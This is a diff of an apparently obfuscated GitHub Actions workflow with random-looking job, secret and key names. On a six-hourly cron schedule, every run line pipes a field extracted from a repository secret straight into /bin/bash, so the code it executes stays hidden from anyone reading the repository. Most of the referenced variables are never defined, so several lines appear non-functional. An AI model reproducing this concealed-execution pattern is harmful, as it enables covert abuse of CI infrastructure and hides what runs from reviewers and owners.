@@ -2,8 +2,8 @@ name: sunxinniang4817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
-jobs:  # 3464
+    - cron: '49 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,14 +11,10 @@ jobs:  # 3464
       - uses: actions/checkout@v4
       - name: sunxinniang4817
         env:
-          sh3: ${{ secrets.sh3 }}
+          ewvp381: ${{ secrets.ewvp381 }}
         run: |
-          echo $sh3 | jq -r .ka73734 | /bin/bash
-          echo $fbt70 | jq -r .vd972 | /bin/bash
-          echo $fiktd70 | jq -r .peq4 | /bin/bash
-          echo $moiqw9 | jq -r .zxl0862 | /bin/bash
-          echo $rpp5 | jq -r .r4 | /bin/bash
-          echo $jbogm2 | jq -r .s1040 | /bin/bash
-          echo $syc54824 | jq -r .fbh4805 | /bin/bash
-          echo $ya51 | jq -r .m945 | /bin/bash
+          echo $ewvp381 | jq -r .wtb6741 | /bin/bash
+          echo $gfkhb95 | jq -r .hs8 | /bin/bash
+          echo $jfvzm4 | jq -r .utyrz84577 | /bin/bash
+          echo $tpuw9116 | jq -r .v90600 | /bin/bash
 
